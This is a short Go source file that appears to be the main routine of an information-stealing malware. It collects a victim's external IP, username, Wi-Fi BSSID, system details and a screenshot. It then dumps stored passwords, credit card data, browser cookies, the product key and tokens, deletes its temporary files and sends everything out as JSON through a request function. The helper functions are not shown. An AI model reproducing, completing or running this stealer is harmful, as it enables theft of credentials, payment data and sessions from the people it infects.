package main

import (
	"encoding/json"
)

type geninf struct {
	Ip         string  `json:"ip"`
	Username   string  `json:"username"`
	BSSID      string  `json:"bssid"`
	Info       SysInfo `json:"info"`
	Screenshot string  `json:"screenshot"` // This should be an actual Base64 encoding of the file
}

type dumps struct {
	Passwords   []PASSWD   `json:"passwords"`
	CreditCards []CCARD    `json:"credit-cards"`
	Cookies     []COOKIE   `json:"cookies"`
	ProductKey  PRODUCTKEY `json:"product-key"`
	Tokens      []string   `json:"tokens"`
}

type OUTPUT struct {
	GeneralInfo geninf `json:"general-info"`
	Dumps       dumps  `json:"dumps"`
}

func main() {
	IP_ADDR := GetExternIP()

	out := OUTPUT{
		GeneralInfo: geninf{
			// Anchor 1
			Ip:         IP_ADDR,
			Username:   GetUsername(),
			BSSID:      GetBSSID(),
			Info:       *GetSysInfo(),
			Screenshot: GetScreenShot(), // We'll need to read the contents of the output
		},
		Dumps: dumps{
			// Anchor 2
			Passwords:   GetPasswords(),
			CreditCards: GetCreditCards(),
			Cookies:     GetCookies(),
			ProductKey:  *GetProductKey(),
			Tokens:      GetTokens(),
		},
	}

	// Anchor 3

	CleanUp() // <- Removes all the temp files generated

	x, _ := json.Marshal(out)
	SendRequest(string(x))
}
